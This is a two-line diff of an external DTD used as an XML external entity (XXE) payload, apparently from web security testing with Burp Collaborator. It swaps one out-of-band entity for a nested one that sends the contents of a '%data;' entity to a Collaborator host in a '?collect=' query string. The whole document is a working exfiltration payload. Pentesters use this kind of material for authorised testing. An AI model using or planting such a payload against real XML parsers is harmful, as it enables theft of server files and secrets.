@@ -1,1 +1,2 @@
-<!ENTITY % exfiltrate SYSTEM 'http://dzgltx40b4az08emu4gvh1nztqzond.burpcollaborator.net/'>
+<!ENTITY % all "<!ENTITY xxe SYSTEM 'http://egymayl1s5r0h9vnb5xwy240argq4f.burpcollaborator.net?collect=%data;'>">
+%all;
